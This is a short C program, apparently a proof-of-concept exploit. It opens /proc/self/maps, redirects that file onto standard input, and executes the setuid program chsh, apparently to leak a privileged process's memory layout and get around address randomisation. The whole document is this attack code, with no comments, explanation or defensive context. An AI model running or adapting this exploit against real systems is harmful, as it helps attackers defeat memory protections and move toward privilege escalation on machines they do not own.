#include <unistd.h>
#include <fcntl.h>

int main(int argc, char **argv)
{
	
	int fd = open("/proc/self/maps", O_RDONLY);
	dup2(fd, 0);
	execl("/usr/bin/chsh", "chsh", NULL);
	return 0;
}
